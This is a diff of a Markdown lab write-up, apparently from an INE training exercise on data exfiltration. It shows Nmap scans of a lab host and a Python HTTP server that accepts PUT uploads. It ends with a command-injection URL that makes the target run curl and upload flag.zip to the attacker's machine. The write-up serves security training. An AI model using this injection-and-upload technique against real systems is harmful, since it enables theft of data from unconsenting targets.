@@ -1,6 +1,4 @@
-# Data Exfiltration
-
-## 🔬
+# 🔬Data Exfiltration
 
 The Kali OS GUI instance is web hosted on the INE website, where:
 
@@ -29,7 +27,7 @@ _**Tools**_ used:
     lo               UNKNOWN        127.0.0.1/8 
     ip_vti0@NONE     DOWN           
     eth0@if126463    UP             10.1.0.17/16
-
+    
     root@INE:~# ping demo.ine.local
     PING demo.ine.local (192.70.33.3) 56(84) bytes of data.
     64 bytes from demo.ine.local (192.70.33.3): icmp_seq=1 ttl=64 time=0.159 ms
@@ -53,7 +51,7 @@ _**Tools**_ used:
     PORT     STATE SERVICE
     8000/tcp open  http-alt
     MAC Address: 02:42:C0:46:21:03 (Unknown)
-
+    
     Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
     ```
 
@@ -67,7 +65,7 @@ _**Tools**_ used:
 
     ```shell
     root@INE:~# less nmap/dataexfiltration.nmap
-
+    
     # Nmap 7.92 scan initiated Thu May  5 14:31:09 2022 as: nmap -sC -sV -oA nmap/dataexfiltration 192.70.33.3
     Nmap scan report for demo.ine.local (192.70.33.3)
     Host is up (0.0000080s latency).
@@ -76,7 +74,7 @@ _**Tools**_ used:
     8000/tcp open  http    Werkzeug httpd 0.15.2 (Python 2.7.16)
     |_http-title: Site doesn't have a title (text/html; charset=utf-8).
     MAC Address: 02:42:C0:46:21:03 (Unknown)
-
+    
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     # Nmap done at Thu May  5 14:31:15 2022 -- 1 IP address (1 host up) scanned in 6.91 seconds
     ```
@@ -123,7 +121,7 @@ _**Tools**_ used:
     ```shell
     root@INE:~# which python
     /usr/bin/python
-
+    
     root@INE:~# nano httpserver.py
     ```
 
@@ -133,7 +131,7 @@ _**Tools**_ used:
     #!/usr/bin/python
     import SimpleHTTPServer
     import BaseHTTPServer
-
+    
     class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         def do_PUT(self):
             print self.headers
@@ -146,9 +144,9 @@ _**Tools**_ used:
     if __name__ == '__main__':
         SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
     ```
-
+    
     > _Thanks to_ [_BigBlueHat_](https://gist.github.com/BigBlueHat/0ca3894f715aac2f2e40af3a8aa0a436) _for the script._
-
+    
     * Run the SimpleHTTP server using the script:
       * **`python httpserver.py 80`**
     * Try again the PUT request `http://demo.ine.local:8000/?cmd=curl+192.70.33.2+-T+flag.zip`
